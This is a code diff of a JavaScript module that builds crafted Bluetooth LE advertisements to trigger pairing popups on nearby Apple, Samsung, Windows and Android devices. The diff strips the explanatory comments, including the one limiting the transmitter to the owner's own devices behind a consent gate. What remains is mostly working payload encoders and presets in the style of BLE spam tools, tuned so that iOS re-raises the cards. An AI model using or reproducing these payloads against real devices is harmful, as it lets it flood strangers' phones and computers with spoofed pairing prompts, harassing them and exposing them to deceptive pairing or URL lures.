@@ -1,39 +1,13 @@
-// microspec runtime — the emit side: build the exact AD structures that raise each proximity-pairing popup.
-//
-// The inverse of blesig.js. Each encoder returns the `structures` array ble.advertiseRaw wants —
-// { kind: "mfg"|"svc", id, data(hex) } — and the round-trip is a unit gate: what we EMIT must decode back,
-// through signatures(), to what we INTENDED. That is the only honest check available off-device.
-//
-// This is the LAB transmitter, scoped to the owner's own devices behind a consent gate. The reliability
-// tuning (which dynamic fields a modern iOS needs, MAC-rotation cadence) is UNKNOWN off-device
-// (docs/research/ble-air.md §7) — these payloads are the plain, documented shapes; the owner tunes on the
-// hardware. Pure — no DOM, no clock, no shell.
-
 const enc = new TextEncoder();
 const hx = (bytes) => Array.from(bytes, (b) => (b & 0xff).toString(16).padStart(2, "0")).join("");
 const mfg = (id, bytes) => ({ kind: "mfg", id, data: hx(bytes) });
 const svc = (id, bytes) => ({ kind: "svc", id, data: hx(bytes) });
 
-// The one thing that makes Apple's cards actually fire from an Android AdvertiseData.Builder path (VERIFIED
-// against simondankelmann/Bluetooth-LE-Spam, docs/research/ble-apple-emit.md): the dynamic tail must be
-// NON-ZERO. Android's AdvertiseDataParser.removeTrailingZeros strips trailing 0x00 from every legacy
-// advertisement (Peripherals.java:246), so a payload that ends in a zero-filled "encrypted" tail arrives on
-// air TRUNCATED — its inner TLV length byte then overruns the shortened data and iOS discards the message.
-// The working apps fill that tail with Random.nextBytes(n): non-zero, so it survives the strip, AND fresh
-// each cycle, which is what a current iOS wants before it re-raises a card for a "new" device.
-//
-// `rnd` is that entropy source — a function (n) => bytes the caller supplies (the app hands it
-// crypto.getRandomValues). Omitted, it falls back to a FIXED non-zero pattern so this pure module stays
-// deterministic for the round-trip gate: a static packet still survives the strip and raises the FIRST card,
-// but re-firing on a modern iOS wants the real per-cycle entropy — so the app passes `rnd`.
-const FILL = 0xba;                                   // any non-zero byte; the point is only that it is not 0x00
+const FILL = 0xba;
 function noise(rnd, n) {
   if (typeof rnd === "function") return Array.from(rnd(n), (b) => b & 0xff);
   return new Array(n).fill(FILL);
 }
-// The last byte on air must never be 0x00, or Android strips it and the inner length byte overruns. Random
-// entropy can land a zero there ~1 cycle in 256, so the terminator is forced non-zero (this byte is opaque
-// auth/encrypted state, so setting bit 0 is immaterial).
 function nz(bytes) { bytes[bytes.length - 1] |= 0x01; return bytes; }
 
 const APPLE = 0x004c, MICROSOFT = 0x0006, SAMSUNG = 0x0075;
@@ -46,9 +20,6 @@ const FAST_PAIR = 0xfe2c, EDDYSTONE = 0xfeaa;
  * test iPad); newer iOS wants the field varied, which is on-device tuning, not something to fake here.
  */
 export function nearbyAction(actionType, rnd) {
-  // The 3-byte auth tag is NON-ZERO (random per cycle in the working apps) — a zero tag would be the last
-  // bytes on air and get stripped, corrupting both messages. The Nearby Info that rides along ends in its
-  // own non-zero auth for the same reason.
   const action = [0x0f, 0x05, 0xc0, actionType & 0xff, ...noise(rnd, 3)];
   const info = [0x10, 0x05, 0x00, 0x00, ...noise(rnd, 3)];
   return [mfg(APPLE, nz([...action, ...info]))];
@@ -61,11 +32,11 @@ export function nearbyAction(actionType, rnd) {
  *  the model code does, and 0x07 is the proven-on-air value). */
 export function proximityPairing(model = 0x0e20, rnd) {
   const body = [
-    0x07, (model >> 8) & 0xff, model & 0xff,   // prefix + device model (big-endian)
-    0x55, ...noise(rnd, 1), ...noise(rnd, 1),  // status + pods battery + charging/case battery
-    ...noise(rnd, 1),                          // lid-open counter — must vary for a re-fire
-    0x00, 0x00,                                // colour + reserved
-    ...nz(noise(rnd, 16)),                     // 16-byte "encrypted" tail — random on air, never ends in zero
+    0x07, (model >> 8) & 0xff, model & 0xff,
+    0x55, ...noise(rnd, 1), ...noise(rnd, 1),
+    ...noise(rnd, 1),
+    0x00, 0x00,
+    ...nz(noise(rnd, 16)),
   ];
   return [mfg(APPLE, [0x07, body.length, ...body])];
 }
@@ -83,10 +54,6 @@ export function fastPair(modelId = "cd8256") {
   return [svc(FAST_PAIR, [parseInt(m.slice(0, 2), 16), parseInt(m.slice(2, 4), 16), parseInt(m.slice(4, 6), 16)])];
 }
 
-// Samsung EasySetup — the Galaxy Watch "pair" card on a nearby Samsung phone. VERIFIED byte layout
-// (docs/research/ble-air.md §9): a fixed 10-byte prefix + a 1-byte watch model id. The shown text is NOT
-// free-form — it is Samsung's own device string, chosen by the id — so this is a `none` text kind, and
-// whether One UI 7/8 still raises the card is UNKNOWN, so it ships experimental.
 const SAMSUNG_WATCH_PREFIX = [0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43];
 export function samsungWatch(watchId = 0x1a) {
   return [mfg(SAMSUNG, [...SAMSUNG_WATCH_PREFIX, watchId & 0xff])];
@@ -117,9 +84,6 @@ export function eddystoneUrl(url = "https://example.com") {
  * rest are one-tap. Order mirrors the analyzer grid: the two vectors that reliably raise UI on a current
  * stock device (Swift Pair on Windows 11, Fast Pair on Android) lead; Apple/Samsung stay experimental.
  */
-// `build(value, rnd)` — the app hands `rnd = (n) => crypto.getRandomValues(new Uint8Array(n))`. Apple presets
-// are `dynamic`: their payload must be re-randomised each cycle for a modern iOS to re-raise the card, so the
-// app re-emits them on an interval. The static-text presets need no entropy and no re-emit.
 export const PRESETS = [
   { id: "swiftPair", vendor: "microsoft", target: "windows", custom: "name", build: (v) => swiftPair(v) },
   { id: "fastPair", vendor: "google", target: "android", custom: "model", connectable: true, build: (v) => fastPair(v) },
@@ -138,8 +102,8 @@ export function assemble(structures) {
     const idLo = (s.id & 0xff).toString(16).padStart(2, "0");
     const idHi = ((s.id >> 8) & 0xff).toString(16).padStart(2, "0");
     const type = s.kind === "svc" ? "16" : "ff";
-    const value = idLo + idHi + s.data;               // little-endian id, then the value
-    const len = (1 + value.length / 2).toString(16).padStart(2, "0");   // AD length counts the type octet too
+    const value = idLo + idHi + s.data;
+    const len = (1 + value.length / 2).toString(16).padStart(2, "0");
     out += len + type + value;
   }
   return out;
